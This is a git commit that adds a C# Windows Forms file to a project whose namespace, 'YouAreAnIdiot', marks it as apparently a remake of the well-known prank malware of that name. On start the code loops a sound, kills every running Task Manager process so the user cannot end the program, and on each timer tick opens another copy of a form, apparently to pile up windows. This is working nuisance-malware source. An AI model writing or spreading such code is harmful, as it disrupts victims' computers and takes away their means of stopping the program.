d6e9780c82eda6751c80c31fcb1781702d86836f
seany8900 <73094500+seany8900@users.noreply.github.com>
2021-09-11 12:44:08 -0700

    Add files via upload

---
+++ ProgramFiles/Form2/Form2.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Media;
+using System.IO;
+using System.Diagnostics;
+
+namespace YouAreAnIdiot
+{
+    public partial class Form2 : Form
+    {
+        private SoundPlayer _soundPlayer;
+        public Form2()
+        {
+            InitializeComponent();
+
+            _soundPlayer = new SoundPlayer();
+            _soundPlayer.Stream = Resources.Resource1.yaaiwav1;
+            _soundPlayer.PlayLooping();
+
+
+
+
+            foreach (Process proc in Process.GetProcessesByName("TaskMgr"))
+            {
+
+
+                proc.Kill();
+
+            }
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Form1 frm = new Form1();
+            frm.BringToFront();
+            frm.ShowDialog();
+        }
+    }
+}
